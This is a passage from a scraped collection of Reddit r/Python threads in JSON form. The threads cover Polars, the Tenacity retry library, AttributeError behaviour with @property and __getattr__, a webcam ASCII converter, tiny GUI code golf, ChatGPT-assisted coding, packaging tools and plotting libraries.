            "content": "Why are you splitting your initial file into multiple LazyFrames? I’m assuming by JSONL, you mean newline-delimited JSON. Just read into a single lazy frame using polars.read_ndjson(). If the total size is going to be greater than can be stored in memory, leave it as a LazyFrame instead of loading it into memory as a full DataFrame, then write it to your delta table using whatever partitioning schema you need.",
            "replies": [
                {
                    "author": "EngiNerd9000",
                    "score": "2",
                    "content": "Yeah, new line delimited JSON (also, I think scan_ndjson reads it into a LazyFrame vs read_ndjson). Im trying to flatten the json data into entities and include foreign keys to write to a data warehouse. And the question is generally trying to uncover if there is are some sort of caching mechanisms (similar to pyspark) or other Polars specific settings that could help when writing multiple LazyFrames/DataFrames that extend from the same initial dataset to Delta Tables."
                }
            ]
        },
        {
            "author": "realitythreek",
            "score": "-15",
            "content": "",
            "replies": [
                {
                    "author": "EngiNerd9000",
                    "score": "8",
                    "content": "I have, and I find that it's usually very good at getting the broad strokes right, helping to identify issues with existing code, and giving you a jumping off point when trying to solve a problem, but when it comes to high levels of efficiency, staying up to date on libraries, and specific functionality, I find it lacking at times (including asking it this question with follow ups)."
                }
            ]
        }
    ]
},
{
    "post_author": "Balance-",
    "post_id": "1c5q36n",
    "post_score": "10",
    "post_time": "Tuesday, April 16, 2024 at 11:15:01 PM GMT+3",
    "flair_text": "News",
    "post_title": "UXsim 1.1.1 released: Significantly increased performance for the network traffic flow simulator",
    "media": [
        "https://github.com/toruseo/UXsim/releases/tag/v1.1.1"
    ],
    "post_content": "Version 1.1.1 of UXsim is released, which improves performance significantly.\nMain Changes in 1.1.1\nAdd setting to adjust vehicle logging time interval via World.vehicle_logging_timestep_interval\nBy lowering the interval (e.g., World.vehicle_logging_timestep_interval=2), the simulation time can be reduced (~20% speed up), and we can obtain vehicle trajectory data with slightly less accuracy.\nThe logging setting does not affect the internal simulation accuracy. Only the outputted trajectories are affected.\nBy setting World.vehicle_logging_timestep_interval=-1, the record_log is turned off, and the simulation time can be significantly reduced (~40% speed up).\nThis addresses Issue #58\nCorrect route choice behavior\nVehicle.links_prefer and Vehicle.links_avoid work correctly now.\nUXsim\nUXsim is a free, open-source macroscopic and mesoscopic network traffic flow simulator written in Python. It simulates the movements of car travelers and traffic congestion in road networks. It is suitable for simulating large-scale (e.g., city-scale) traffic phenomena. UXsim is especially useful for scientific and educational purposes because of its simple, lightweight, and customizable features, but users are free to use UXsim for any purpose.",
    "comments": []
},
{
    "post_author": "pysk00l",
    "post_id": "1c0s3ep",
    "post_score": "73",
    "post_time": "Wednesday, April 10, 2024 at 9:04:13 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "Awesome Python Library: Tenacity",
    "media": [
        "https://new.pythonforengineers.com/blog/awesome-python-library-tenacity/",
        "https://tenacity.readthedocs.io/en/latest/"
    ],
    "post_content": "When writing code or tests in Python, one issue I had was when the code would fail due to random things like network issues or external peripherals not responding in time.\nSo I had to add extra code to retry the code, but this added unnecessary complexity.\nThats when I discovered the Tenacity library and it saved me hours and a lot of useless boilerplate code.\nLink: https://tenacity.readthedocs.io/en/latest/\nI wrote a blog on it with some examples:\nhttps://new.pythonforengineers.com/blog/awesome-python-library-tenacity/",
    "comments": [
        {
            "author": "wineblood",
            "score": "12",
            "content": "This looks like it overlaps with backoff quite a bit.",
            "replies": [
                {
                    "author": "DigThatData",
                    "score": "9",
                    "content": "I think you mean backoff overlaps with tenacity. Based on their LICENSE files, Tenacity was created two years before backoff. Tenacity's most recent commit to main was a month ago, backoff's was 14 months ago. Judging by any github metric (stars, forks, contributors), Tenacity's community is 2x Backoff's."
                }
            ]
        },
        {
            "author": "ThatSituation9908",
            "score": "13",
            "content": "Backoff is the popular alternative Also consider stamina which is a wrapper on tenacity but adds opinionated defaults: https://github.com/hynek/stamina",
            "replies": [
                {
                    "author": "Drevicar",
                    "score": "5",
                    "content": "Friendship ended with Tenacity. Now Stamina is my best friend. This library looks great! Thank you for the share."
                }
            ]
        },
        {
            "author": "thedeepself",
            "score": "3",
            "content": "Yes it's the best retry library but it's very hard to find on PyPI when you search for retry."
        },
        {
            "author": "ace_hawk5",
            "score": "4",
            "content": "I use Tenacity to kill weeds in my yard. It's only right that I now use it with Python.",
            "replies": [
                {
                    "author": "cum_pumper_4",
                    "score": "1",
                    "content": "That stuff is so expensive"
                }
            ]
        },
        {
            "author": "thisismyfavoritename",
            "score": "2",
            "content": "hours uh?"
        },
        {
            "author": "ChangeIntoBetter",
            "score": "2",
            "content": "Nice share. Looks like something I could study and use as well."
        },
        {
            "author": "rowr",
            "score": "1",
            "content": "I'm a big fan of tenacity for slow/spotty data fetches from servers. It's super easy to add to existing code since it's decorator-based. Anything that tenacity can't handle it's pretty much time to use a hefty orchestration system like Dagster or Airflow."
        }
    ]
},
{
    "post_author": "Hatteras-",
    "post_id": "1c435zw",
    "post_score": "21",
    "post_time": "Sunday, April 14, 2024 at 11:21:04 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Behavior of AttributeError in @property and __getattr__",
    "media": [],
    "post_content": "I'm sure that many people have encountered the following (code for reproduction below) behavior: if during the execution of `@property`, an `AttributeError` is raised and the same class implements `__getattr__` then `__getattr__` is invoked with the name of the property resulting in a confusing message: `AttributeError: 'Foo' object has no attribute 'something'`. If we remove `__getattr__` then we get a more meaningful and correct message: `AttributeError: 'Foo' object has no attribute 'bar'`.\nfrom dataclasses import dataclass\n\n@dataclass\nclass Foo: val = 'foo_value'\n\nclass Test: \n    def __init__(self): \n        self.foo = Foo()\n\n    def __getattr__(self, name):\n        return getattr(self.foo, name)\n    \n    @property\n    def something(self):\n        return self.foo.bar\n\nt = Test() t.something\nThe error message is misleading and the behavior catches many people (myself including) in surprise and results in many wasted hours of debugging. I've seen people recommend using a custom decorator (instead of `@property` that catches attribute error) or wrapping your `@property` bodies in `try/except`. But it seems to me that this should be dealt with on language level.\nI'm trying to understand a few things:\nIs this behavior in Python intentional (i.e. is there a good reason) or just stems from the fact that `__getattr__` is invoked when `AttributeError` is raised when an instance attribute is accessed?\nIf not intentional, is there a relatively easy way to detect `AttributeErrors` cause by `@property` execution in CPython? If so, why hasn't this been handled on language level?\nI've searched CPython issues on Github and I saw someone trying to correct documentation but couldn't find issues asking about this behavior or suggestions to fix - am I missing something?",
    "comments": [
        {
            "author": "fortunatefaileur",
            "score": "25",
            "content": "in reality, you should just not use __getattr__ nearly as often as people who have just discovered it always want to do, and this case is merely a bug in your code that you should not introduce and/or have a test for, so the practical problem is extremely rare. as to what's happening: https://stackoverflow.com/questions/32191405/attributeerror-and-lost-exception-message",
            "replies": [
                {
                    "author": "Adrewmc",
                    "score": "2",
                    "content": "This is the correct answer. When using @property you are saying this attribute has a specific getter and setter (and delete function). I have a reason for changing from the norm. And those are handled as coded @property #getter def attr(self): return self._attr @attr.setter def attr(self, data): self._attr = data Python naturally comes with setters and getters, by sometime those need to be changed. class classHero: @property #getter def heath(self): return self._HP @health.setter def health(self, num ): if num < 0: self._HP = 0 elif num > self.max_hp: self._HP = self.max_hp else: self._HP = num I use a similar format to put images into a the format I want in code often. Set as path return as binary thing at path. .jog, .png. .gif etc So now the class checks if the HP is above max. So now when hero = classHero(user) print(hero.health) >>>100 hero.health -= 20 print(hero.health) >>>80 hero.health += 70 print(hero.health) >>>100 The health never overflows, and a lot of different object are loaded this way. __getattr__ Is something you should have much more familiarity with Python before you over write. I 100% agree this dunder should not generally be touched because @property exists to make those exceptions.",
                    "replies": [
                        {
                            "author": "Hatteras-",
                            "score": "1",
                            "content": "Be that as it may... Why not remove odd behavior, if relying on odd behavior is considered bad practice. I believe this exact behavior (AttributeError from getter reaching __getattr__) isn't solving any special problems so why not make the language itself safer and easier to use? I would understand if it was solving some special problem or making the language more powerful but I believe everything that it could be used for, can be handled in better ways. So I generally don't understand the design choice.",
                            "replies": [
                                {
                                    "author": "Adrewmc",
                                    "score": "1",
                                    "content": "Because some of the times __getattr__ can be written in C… but we want getattr() to work for everything. Sometimes the @property is written in C. As you can see the regular __getattr__ produces the correct error this is built in as well. Generally speaking dunder behavior is what Python expects normally, if we need to change that then we can, however changing certain ones can be tricker then others for example, we overwrite __init__ naturally that most people don’t even realize your overwriting anything at all. But we have it has a dunder because __init__ is usually called at class creation so we want to ensure it exists regardless. By using @property you make a specific getter for that attribute while leaving the rest of the attributes to function as normal, this would be complicated to do correctly yourself, by changing __getattr__ you change how all attributes will be gotten in the entire class. This is why using it is important because generally speaking we will only want to change the behavior of certain attributes not all of them at once. If you need to change the behaviors of all of them then normally you are writing in C, and thus that will need to function with the __getattr__ hook in Python to access the dot operators as you would expect it. Since __getattr__ it can do a lot of base level functionality you have to remember inside the class your also overwriting all of the __getatrr__ for inherited classes, and that will start to get messy. So here when you call res = t.something You actually go res = t.__getattr__(“something”) Which in your code will GOTO res = getattr(t.foo, “something”) Which goes res = foo.__getattr__(“something”) Which ends __main__.__setattr__(“res”, t.__getattr__(t._getattr__(“foo”).__getattr__(“something”))) Or something up there in namespace. I generally don’t want to write code like that do you? I much rather prefer the top one. But I like understanding that I can actually adjust those in specific scenarios and by knowing that I think it clear…I sort of don’t want to mess around too much with those ones. I want that stuff to just work. And foo has no attribute something and the entire class has broken you can’t access any of the base attributes. And thus your error was correct, as it never got to even asking about .bar that part never ran."
                                }
                            ]
                        }
                    ]
                },
                {
                    "author": "Hatteras-",
                    "score": "0",
                    "content": "The bug is indeed in \"my\" code but the exception message is misleading is what I'm trying to express. I understand that `__getattr__` will be invoked when `AttributeError` is raised on an actual attribute but should that be the same for `AttributeError` raised inside `@property`? After all, `@property` definitely exists on the class."
                }
            ]
        },
        {
            "author": "lfdfq",
            "score": "13",
            "content": "In a sense, trying to access an attribute and it raising AttributeError is the definition of the attribute not existing. It's not really special about property, but all of the attribute accessing machinery. Trying to access t.something and it raising an AttributeError means that the \"something\" attribute doesn't exist, and so that's why getattr was invoked. I think this is probably working exactly as intended.",
            "replies": [
                {
                    "author": "Hatteras-",
                    "score": "1",
                    "content": "When an `AttributeError` is raised inside `@property`, at least in my example, the exception is for `self.foo.bar` not `self.something` or `t.something`. If this specific behavior (regarding `@property` not the general `AttributeError` and `__getattr__`) was intended then would you rely on this behavior - i.e. `t.something` raising AttributeError and expecting `__getattr__` to handle it? I suppose if `self.foo.something` existed then the code would work but I doubt I'd write code like that even when I know exactly how it works."
                }
            ]
        }
    ]
},
{
    "post_author": "eebmagic",
    "post_id": "bvekft",
    "post_score": "1750",
    "post_time": "Saturday, June 1, 2019 at 2:45:22 AM GMT+3",
    "flair_text": "",
    "post_title": "I made a webcam to ascii converter with opencv",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "eebmagic",
            "score": "92",
            "content": "Here’s the source: https://github.com/eebmagic/videoAscii This is the first project that I’ve had enough confidence about to post here. I’d love any suggestions/constructive criticisms, especially for getting smoother output.",
            "replies": [
                {
                    "author": "0x256",
                    "score": "69",
                    "content": "especially for getting smoother output. Move as much as you can out of the loop (e.g. the stty size call, or repeated int() calls for values that never change). Use x//16 instead of int(x/(255/16)). It was off-by-one anyway, which is why you needed 17 chars instead of 16 as one would expect. Do not call os.system(\"clear\"), just let the old content be pushed out of the window. Simply remove that line. Printing everything as a single multi-line string was already a good idea. This prevents a lot of buffer-flushing overhead and prevents tearing. You may save a few more milliseconds per frame by working with byte-strings and writing directly to sys.sysout.buffer.write(). You copy around lists a lot. You can save most of these by doing everything in one step, using list-comprehensions instead of for-loops and scrap the helper-function that just contain a few lines of code. Do everything directly in the main loop. The code is short enough, so that's okay. Iterators, for-loops and function-calls are expensive, compared to inline list-comprehensions. For order, use a single string with 17 (16) chars instead of a list of one-char strings. Same effect, less overhead. You can write the entire print logic in a single line if you really want to. Less readable, but a lot faster. print('\\n'.join(''.join(\" .',:;clxokXdO0KN\"[c//16] for c in row) for row in reduced), end=\"\") edit: Please don't be intimidated, and don't stop experimenting yourself. I had fun playing with your code and optimizing it for speed, but that one-liner is definitely not a pythonic way to do things.",
                    "replies": [
                        {
                            "author": "kristopolous",
                            "score": "22",
                            "content": "Don't even let content be pushed out. Use ANSI escape (https://en.m.wikipedia.org/wiki/ANSI_escape_code#CSI_sequences) to move the cursor and draw over it. In fact, you can use a trick and just skip forward to change the changed stuff. Also you can use this to do interlacing"
                        }
                    ]
                },
                {
                    "author": "KappaClosed",
                    "score": "35",
                    "content": "especially for getting smoother output. Well, you are asking quite a lot of your terminal emulator here... I'm actually impressed by the performance you've been able to squeeze out thus far. One thing you might want to try is to use a GPU accelerated terminal emulator like alacritty.",
                    "replies": [
                        {
                            "author": "eebmagic",
                            "score": "16",
                            "content": "Yeah I tried to run it on my raspberry pi and it was kinda rough. I’m just using the default Mac terminal, but I’ll give it a look thanks! :)"
                        }
                    ]
                },
                {
                    "author": "[deleted]",
                    "score": "8",
                    "content": "This is next level matrix for our society. Rock fucking on!"
                }
            ]
        },
        {
            "author": "Edewede",
            "score": "52",
            "content": "Okay now make an ascii converter to webcam!"
        },
        {
            "author": "iGreenHedge",
            "score": "17",
            "content": "I was planning to make a project like this. :( oh well. Glad to see someone did it though. Edit: thanks for the words of advice:)"
        },
        {
            "author": "[deleted]",
            "score": "13",
            "content": "That's really cool. Does it print out to console? I can't see very well on the video. I was thinking of making something that rasterizes like the comic book effect with the different sized dots but that'd need another surface to output the image."
        },
        {
            "author": "eebmagic",
            "score": "11",
            "content": "I just noticed how blurry this video is. https://imgur.com/jgnqHPB Here's a clearer version where you can see the letters."
        },
        {
            "author": "killbot5000",
            "score": "6",
            "content": "How did you come up with this list? order = [' ', '.', \"'\", ',', ':', ';', 'c', 'l', 'x', 'o', 'k', 'X', 'd', 'O', '0', 'K', 'N']"
        },
        {
            "author": "DivineSentry",
            "score": "6",
            "content": "Wonder if i could somehow use the ASCII video as the actual webcam output, as in im on live call on skype and want them to see my ASCII feed not real feed, not sure if im being understood here"
        },
        {
            "author": "hige0soru",
            "score": "5",
            "content": "I always hoped learning coding would allow me to see the matrix. Nice work!"
        },
        {
            "author": "mohit__",
            "score": "4",
            "content": "Can someone please explain what this is?"
        },
        {
            "author": "Chumberly2",
            "score": "3",
            "content": "I could totally see a company setting a huge screen up at a conference and have walkers by see their pixel bodies walk/dance around."
        }
    ]
},
{
    "post_author": "[deleted]",
    "post_id": "jwgj0v",
    "post_score": "1831",
    "post_time": "Wednesday, November 18, 2020 at 5:17:18 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "My students challenged me to write the smallest graphical user interface that includes actual user interaction. Can it be any smaller than this?",
    "media": [
        "https://external-preview.redd.it/OD_3BhIgRolih-FT3OvhwEzWal3T4TDlHQUO0Fn3f08.jpg?width=640&crop=smart&auto=webp&s=eea3933dd376af0848dae86178d0977521869e65",
        "https://i.imgur.com/7IzYFDJ.jpg"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "foreverwintr",
            "score": "519",
            "content": "You can get rid of your lambda and just pass print directly. 🙂",
            "replies": [
                {
                    "author": "mbussonn",
                    "score": "340",
                    "content": "a from wx import * is 7 extra characters, but then you can dromp 4 times wx. which is 12 chars total, so 5 gained ?",
                    "replies": [
                        {
                            "author": "[deleted]",
                            "score": "",
                            "content": "I didn't know import * could get worse.",
                            "replies": [
                                {
                                    "author": "Peterotica",
                                    "score": "244",
                                    "content": "I didn't know import * could get worse."
                                },
                                {
                                    "author": "hackintosh5",
                                    "score": "39",
                                    "content": "WHAT THE FUCK"
                                },
                                {
                                    "author": "Comm4nd0",
                                    "score": "23",
                                    "content": "I'm calling the cops"
                                },
                                {
                                    "author": "hlx-atom",
                                    "score": "11",
                                    "content": "The horror"
                                },
                                {
                                    "author": "panzerex",
                                    "score": "8",
                                    "content": "Bury this information."
                                },
                                {
                                    "author": "PM_Me_Trenbies",
                                    "score": "4",
                                    "content": "I don't know shit about programming but I'm curious, where is the Asterix? Which space?"
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "phail3d",
            "score": "142",
            "content": "My contribution, standard library only, 73 70 60 bytes: from tkinter import*;Button(command=print).pack();mainloop() Edit: Forgot pack -> 73 70 60, not 66 bytes. Edit2: Does this count? Again, standard library only. from turtledemo.paint import *;main();done() Edit3: Optimizations with walrus operator, no space in import* Edit4: Thanks to u/socal_nerdtastic for pointing out that creating the Tk object is not required and saving 10 chars (previous version used Button(r:=Tk(),command=print).pack();r.mainloop())",
            "replies": [
                {
                    "author": "mooburger",
                    "score": "51",
                    "content": "yeah I feel like restricted to import only from standard library should be the primary rule."
                }
            ]
        },
        {
            "author": "a27842",
            "score": "345",
            "content": "Imports feel a bit like cheating, though if they aren't you could make a wrapper library that does all this and has a one character import that runs at runtime? Admittedly this is also a very boring option."
        }
    ]
},
{
    "post_author": "meisghost",
    "post_id": "1c2us61",
    "post_score": "150",
    "post_time": "Saturday, April 13, 2024 at 8:52:41 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "ChatGPT / Python",
    "media": [],
    "post_content": "A lot of people are starting to rely on ChatGPT to write code for them from time to time. What I have personally noticed is ChatGPT writes modules so heavy its ridiculous. Last night I was working on an issue a small but technical issue, and asked it for help, it spat out, I kid you not 200+ lines of code and I just thought to myself this cannot be right, it was so heavy I was shaking my head. After some trial and error I got a very elegant piece done in 15 lines of code. Way faster, cleaner and yes reusable. So, it's nice that you can ask CGPT a question from time to time but to rely on it for code structure at this point, in my opinion, no good. Nice to be here!",
    "comments": [
        {
            "author": "AlexMTBDude",
            "score": "73",
            "content": "ChatGPT is great for my Python coding. It's improved my efficiency immensely. But I never copy-paste code from it. I ask it to solve a problem for me, then I look at ChatGPT's solution until I understand it. And THEN I write my own code with the knowledge I gained from ChatGPT. Currently, the way ChatGPT works, if you don't know coding and understand approximately what you need and what the solution is, if you just copy-paste you will end up with garbage code.",
            "replies": [
                {
                    "author": "EmperorLlamaLegs",
                    "score": "29",
                    "content": "Its great for introducing you to new module functionality too. Lots of libraries out there with great features I hadnt heard of."
                },
                {
                    "author": "MarchewkowyBog",
                    "score": "0",
                    "content": "Isn't it tutorial hell all over again? One day ChatGPT API will have a full day outage and you'll struggle to solve problems you thought you knew how to solve",
                    "replies": [
                        {
                            "author": "AlexMTBDude",
                            "score": "8",
                            "content": "This could be said of a lot of things: One day Pycharm will crash and you will have forgotten how to use punch cards for coding :) Technology evolves and we need to evolve with it. Also, there are multiple redundant AIs by now. And as I wrote in my original comment: I make sure that I *understand* the code that the AI produces, I don't just copy-paste it."
                        },
                        {
                            "author": "Personal_Wrap4318",
                            "score": "2",
                            "content": "if youre using the bot as a tutor to converse with and analyze novel code together for a script youre making- why would that be tutorial hell in the same way working with a friend and coding and conversing about it isnt tutorial hell."
                        }
                    ]
                }
            ]
        },
        {
            "author": "lasizoillo",
            "score": "108",
            "content": "This is not a new problem, is a new form of old problem. When you start coding you think that develop is write a code to do some specified thing. When you code for some time you discover that legibility is useful to read and understand your functional code written two months ago. You discover that testeability helps you to fix bugs without create new ones. You discover that some -ility is useful for... That is called experience or seniority. When deadlines are being reached (because you are too inexpert to solve it in time, it was not realistic, shit happened,...) or you are too lazy, taking shortcuts is your salvation. Call those shortcuts copy&paste from other code or docs examples, copy&paste from stack overflow, copy&paste from ChatGPT or code generated by copilot,... they are shortcuts to avoid think about -ilities and get things \"done faster\". And is not new. Many code in official documentation (those that nobody reads) are simplified examples to show a simplified use case (hardcoded examples, no logging, naive error management, ...). Many times ellipse (...) point that something is omitted, but other times are omitted without advertises. Inexperienced people and LLMs learn from those examples without contextualize them. LLMs are juniors with good typewriting skills that can not be mentorized. They can be evolved, fine-tuned, retrained with better datasets,...., but they still are not capable to think about what are doing. The most harder part of develop software is learn what -ilities should be prioritized, where, why and how. Sacrifice legibility to gain some cycles in a hot execution path is a good practice. Sacrifice legibility to reduce some nanoseconds of time in a code which executes once a month is a very bad practice. Even future smarter LLMs will need a lot of prompt engineering to get enough context to generate the better solution for you case.",
            "replies": [
                {
                    "author": "NothingGloomy9712",
                    "score": "26",
                    "content": "Thank you for the comment. I'm new to python and coding, comments like this is the main reason I joined this subreddit"
                },
                {
                    "author": "tazebot",
                    "score": "6",
                    "content": "I think programmers, developers, software engineers, and academics in the field like to think there are immutable laws of coding. If there is an immutable 'law of gravity' of coding it seems to be that code is harder to read than write. That and similar to writing in other disciplines the practice is \"write, re-write, re-write, start over, then re-write some more. Then get a second pair of eyes. Then re-write some more.\""
                }
            ]
        },
        {
            "author": "AlSweigart",
            "score": "13",
            "content": "In my experience over the last year, LLMs like ChatGPT are good for writing code that is at most about 15 or 20 lines long. Even then, you still need to verify and often fix bugs in it."
        },
        {
            "author": "twoonster2020",
            "score": "22",
            "content": "Have you tried including a line limit in the prompt ? If you think about how chatGPT and Generative AI works it then adding an instruction in the prompt could help. For example You are a python code developer, produce a function to do x. It should take no more than 15 lines of code. It should contain comments on how the function works. This might produce more compacted code - or it might not. Since it is conversational and non deterministic then you could also ask it to try again or make the function shorter. It doesn’t understand what it produces just the probability of a give sequence of code or words based on the prompt question.",
            "replies": [
                {
                    "author": "SilkTouchm",
                    "score": "4",
                    "content": "There's no need to give it a 15 line limit. Just add \"write short and concise, yet legible code\" to your prompt."
                }
            ]
        },
        {
            "author": "spidLL",
            "score": "5",
            "content": "For coding I find ChatGPT Plus to be good to lay out ideas and small piece of code and also having discussion about the best approach, and it’s particularly good for EDA. But for real day to day coding GitHub Copilot is in my opinion better."
        },
        {
            "author": "aarrow_12",
            "score": "4",
            "content": "A few thing I find chat GPT useful for are unit test, unblocking myself with new libraries and occasional asking for random examples to get a bad draft of how to glue bits together. I can drop a class or function in, list a few things I explicitly want to test and it'll spit out all the tests being \"mostly\" ready to go. Saves so much time. That or just getting it to spit out examples of \"how would you write this using xyz library without doing abc\". Not gonna give me the answer I need first time, but has gotten me over the mental block of how to approach new libraries. Finally, it's good at getting a first pass on gluing things together that you're struggling to find examples for. Like two ML libraries that just don't have overlapping docs."
        }
    ]
},
{
    "post_author": "Shay-Hill",
    "post_id": "1c0o6da",
    "post_score": "15",
    "post_time": "Wednesday, April 10, 2024 at 6:21:42 PM GMT+3",
    "flair_text": "Tutorial",
    "post_title": "Build and Publish Your Python Project",
    "media": [
        "https://shayallenhill.com/setuptools"
    ],
    "post_content": "In another article, I outlined how to handle Python imports and dependencies in Poetry. Poetry has a lot to recommend it:\nwrites a pyproject.toml file for you\ncreates an environment for you\npins top-level dependencies in pyproject.toml (nice if that’s what you want)\nautomates a lot of adding and removing dependencies\nall of the documentation is in one place\nBut there are a few minor cons:\nadds minor complexity to ci\nadds minor complexity to tox\nsome tools have a hard time finding your environment\nno PEP 621 compliance\nanthonywritescode doesn’t use it, and he knows more than most of the rest of us combined.\nSo, here is an alternative (with its own minor pros and cons). I intend this as a simple reference you can paste commands out of. It will get you through the usual workflow of creating a Python library and hosting it on PyPI.\nhttps://shayallenhill.com/setuptools",
    "comments": [
        {
            "author": "reveil",
            "score": "7",
            "content": "Why use setuptools and not hatchling when official python packaging guide recommends it as default? https://packaging.python.org/en/latest/tutorials/packaging-projects/#choosing-build-backend",
            "replies": [
                {
                    "author": "Shay-Hill",
                    "score": "2",
                    "content": "One very good reason is that I've never even tried it. I'll get around to it one of these days, but I like to use whatever I think the majority is using. The criteria for putting together that workflow was: tools that work (obviously) tools I know within reason, using one command per task unless it was much clearer to use two. Thank you for the feedback.",
                    "replies": [
                        {
                            "author": "Educational-Mind-816",
                            "score": "1",
                            "content": "Don't use useless abstractions. Doesn't sound like u really use it. Setuptools IS what the majority is using.",
                            "replies": [
                                {
                                    "author": "EternityForest",
                                    "score": "2",
                                    "content": "Poetry manages virtual environments and handles lock files for you. It's all stuff you could do by hand, but it's one less script to maintain with Poetry."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "jjrreett",
            "score": "3",
            "content": "poetry doesn’t know how to install dependencies from all alternative index. That’s why i stopped using it.",
            "replies": [
                {
                    "author": "Shay-Hill",
                    "score": "1",
                    "content": "Do you have a link to a description of this issue? It sounds like I should add it to the article. Thank you."
                }
            ]
        },
        {
            "author": "AndydeCleyre",
            "score": "2",
            "content": "A rough equivalent of the given steps using zsh+zpy+uv+flit: $ pipz install uv $ envin $ pipac numpy requests $ pipacs -c dev '-c requirements.txt' pytest pre-commit commitizen flit $ flit init $ pypc $ pips $ mkdir project_name $ print -l '\"\"\"Cool project.\"\"\"' '__version__ = \"0.0.1\"' >project_name/__init__.py $ uv pip install -e . $ flit publish"
        }
    ]
},
{
    "post_author": "Normal_Antenna",
    "post_id": "1c6d7jz",
    "post_score": "0",
    "post_time": "Wednesday, April 17, 2024 at 6:46:08 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Commercial pip packages?",
    "media": [],
    "post_content": "I’m aware there is a big open source community aspect to the python community. So my question is: “would uploading commercial software as a pip package offend the community?” I’m hesitant if this is normal, and if users would consider trials for components that would then make their project ask for a license to work after some time. Just wondering if it’s worth the effort to make products more accessible, or if it would just rub users the wrong way.",
    "comments": [
        {
            "author": "IlliterateJedi",
            "score": "28",
            "content": "Lots of sites put up API packages but you still have to buy the service separately, e.g. HubSpot, Smart sheet, etc."
        },
        {
            "author": "the-pythonista",
            "score": "14",
            "content": "I’d be offended. As a community we pythonistas are all about open source. The majority on Pypi are open source permissive licenses, but there are packages that require licensing to use and they are few and far between."
        },
        {
            "author": "ManyInterests",
            "score": "5",
            "content": "PySimpleGUI recently went commercial and the reception hasn't been good. Its 5.x releases on PyPI have a proprietary license/subscription requirement. Though, I think most of the bitterness is only because it was previously open source and they nuked the original source code from GitHub. That said, nothing would stop you from doing so. You may also choose to host the packages in places other than PyPI. I think this usually just doesn't happen because people generally don't release the source code for commercial Python software or at least favor other distribution methods. One other commercial Python package that comes to mind is Django-viewflow pro. You pay for the ability to install it from their private package server IIRC."
        },
        {
            "author": "metaphorm",
            "score": "6",
            "content": "I don't see why not. some well known companies already do this. for example: twilio's python client boto3 (AWS python client)",
            "replies": [
                {
                    "author": "the-pythonista",
                    "score": "12",
                    "content": "You are not paying to license the code in the package you are paying for the api key to use the cloud services. There’s a difference."
                },
                {
                    "author": "spidLL",
                    "score": "3",
                    "content": "boto3 has an Apache license so it’s open source. Also you can use boto with different cloud provider that supports aws api, so BO, bad example."
                }
            ]
        },
        {
            "author": "chub79",
            "score": "3",
            "content": "I wouldn't be offended. In fact there are trove classifiers for freeware, proprietary license... However, I would suggest to donate to Pypi as a show of good will towards the infrastructure for hosting these packages."
        },
        {
            "author": "spidLL",
            "score": "3",
            "content": "Instead of beating around the bush, tell us more: what’s this amazing piece of software you wrote that you think people would pay for it?"
        }
    ]
},
{
    "post_author": "Jainal09",
    "post_id": "1c0wdvw",
    "post_score": "5",
    "post_time": "Wednesday, April 10, 2024 at 11:57:44 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "\"Gracefully\" Implementing Graceful Shutdowns - FastApi | Kubernetes | WebSockets | Black | Ruff Show",
    "media": [
        "https://github.com/jainal09/fastapi-gracefulshutdown-websockets"
    ],
    "post_content": "Overview\nWhen deploying a new version of an application, it is essential to ensure that no tasks are lost during the deployment process. This is especially important for applications that use WebSockets to maintain real-time connections with clients. In such cases, abruptly terminating the application can lead to data loss and client disconnections.\nWhat My Project Does?\nThis project demonstrates how to implement graceful shutdowns using FastAPI and Kubernetes, that use WebSockets client connections and internal background queues.\nhttps://github.com/jainal09/fastapi-gracefulshutdown-websockets\nTarget Audience\nProduction Use Cases",
    "comments": []
},
{
    "post_author": "Dangerous_Law1678",
    "post_id": "1c5ixdz",
    "post_score": "5",
    "post_time": "Tuesday, April 16, 2024 at 6:27:59 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Question: Tool for editing figures in Python",
    "media": [
        "https://ibb.co/qY9Xk01"
    ],
    "post_content": "So I'm trying to switch from MATLAB to Python for my numerical simulations.\nOne of the things I like about MATLAB is the ability to edit figures by adding stuff (eg arrows, lines, text ... ) to the figure within the software itself. This is what I mean. It's a very handy tool in my line of work and I use it often.\nI was wondering if there's any similar tool for Python. I use matplotlib and seaborn. Any suggestions would be great. Thanks guys!",
    "comments": [
        {
            "author": "_besten",
            "score": "4",
            "content": "For interactive plotting, I would suggest using jupyter notebooks and checkout cufflinks /plotly"
        },
        {
            "author": "AWiselyName",
            "score": "3",
            "content": "I use matplotlib a lots and it's enough for most plotting data I guess. If you want to plot to browser, you can use boker instead."
        },
        {
            "author": "TheZan94",
            "score": "2",
            "content": "Seaborn, plotly, matplotlib are yoir best bets. Also if you like the matlab interface i highly recommend Spyder as editor"
        },
        {
            "author": "annonymus6598",
            "score": "2",
            "content": "matplotlib, numpy."
        },
        {
            "author": "sybarite86",
            "score": "2",
            "content": "Moving from MatLab’s GUI to matplotlib’s code-first approach is definitely a downgrade in user experience. Seaborn, plotnine, jupyter bridge the gap, but not completely and there will always be something that’s not quite right for which you need to hunt down the specific code that you need to use. What helped for me was to switch mindsets to minimal unornamented plots, and to find a good visual theme that works for you and sticking with it. The working style you describe (adding lines, text, etc willy nilly) will only bring you pain when replicating in Python."
        },
        {
            "author": "scrubking101",
            "score": "1",
            "content": "You can do all of that in matplotlib with code. Chatgpt will get you sorted."
        }
    ]
},
{
    "post_author": "alpagames",
    "post_id": "hi5s8f",
    "post_score": "1748",
    "post_time": "Monday, June 29, 2020 at 9:40:33 PM GMT+3",
    "flair_text": "I Made This",
    "post_title": "This beziez curve i've made",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "thingythangabang",
            "score": "52",
            "content": "Love it! Using De Casteljau's algorithm I take it? It just so happens that I've written an entire Bernstein/Bezier package for optimal trajectory generation and would be happy to share the GitHub link with you if you're interested."
        },
        {
            "author": "[deleted]",
            "score": "68",
            "content": "That’s cool as f***k"
        },
        {
            "author": "Sumruv",
            "score": "11",
            "content": "Do you know about chaikins algorithm?"
        },
        {
            "author": "quanta_kt",
